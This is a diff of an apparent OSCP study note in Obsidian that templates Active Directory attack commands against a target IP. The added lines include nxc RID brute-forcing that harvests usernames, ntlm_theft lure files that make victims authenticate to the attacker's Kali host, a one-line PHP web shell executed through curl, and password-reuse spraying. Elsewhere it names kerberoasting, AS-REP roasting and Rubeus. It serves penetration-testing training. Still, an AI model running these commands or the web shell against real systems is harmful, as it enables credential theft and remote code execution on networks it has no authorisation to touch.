@@ -37,7 +37,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 [[Windows LFI RFI]]
 
-
 If File Inclusion can call back to KALI ATTACKER, responder will catch a hash.
 
 [[Responder]]
@@ -73,7 +72,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
-const command = ` nxc smb ${ip} -u 'asdf' -p '' --rid-brute`;
+const command = ` nxc smb ${ip} -u 'asdf' -p '' --rid-brute | grep SidTypeUser | awk '{print $6}' | cut -d'\\\' -f 2 | tee users`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -82,10 +81,57 @@ dv.paragraph("```bash\n" + command + "\n```");
 Add these usernames into user_list
 
 ---
+## Port 139 : SMB
 
-## Only User Obtained : Check Pre-Auth As-rep Kerberoasting
+NetExec Share Listing
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
-### Why Scan for Pre-Authentication?
+const command = `nxc smb ${discoveredDomain} -u [user] -p '[password]' --shares`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+SMB Cred Connect
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `smbclient //${discoveredDomain}/shared -U [user] '[password]'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+With write access to an otherwise empty share named `Shared`, there are files I can drop that might entice any legit visiting user to try to authenticate to my host. [[NTLM Theft]] is a good tool to create a bunch of these files
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `python ~/Desktop/Tools/Windows/ntlm_theft/ntlm_theft.py  -g all -s ${KaliIP} -f exploit`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+If you have write access into Web shares, upload shell.php and curl it
+
+shell.php
+```powershell
+<?php system($_REQUEST['cmd']); ?>
+```
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
+const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `curl ${discoveredDomain}/styles/shell.php?cmd=whoami`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
+## Only User Obtained : 
+
+## Check Pre-Auth As-rep Kerberoasting
+
+ Why Scan for Pre-Authentication?
 
 Normally, Kerberos uses **Pre-Authentication** to prevent password guessing:
 
@@ -123,6 +169,18 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
+
+### Same SVC password
+
+Sometimes the svc account guy has a personal account as well which he reuses the same password for
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `cp ~/Desktop/Tools/Windows/nxc-sweep . && ./nxc-sweep ${ip} -u users -p '[password] --continue-on-success'`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
 ### password spray  
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
@@ -234,7 +292,7 @@ gpp-decrypt [hash]
 
 Whenever getting access to domain credentials it is important to test a few of the tools from `impacket`. In this case we will use `GetUserSPNs.py` to extract encrypted passwords of any kerberoastable service accounts.
 
-User:: svc_deploy
+User:: svc_apache
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine"); const ip = page?.IP ?? "NO IP FOUND"; const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND"; const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Active Directory Toolkit"); const user = pagea?.["User"] ?? "NO USER FOUND";
 ```
@@ -332,6 +390,9 @@ Transfer [[Rubeus.exe]] into VICTIM TARGET
 Once Creds are obtained, use [[Runas]]
 
 ---
+# Lateral Movement
+
+[[Runas]]
 
 # Priv Esc
 
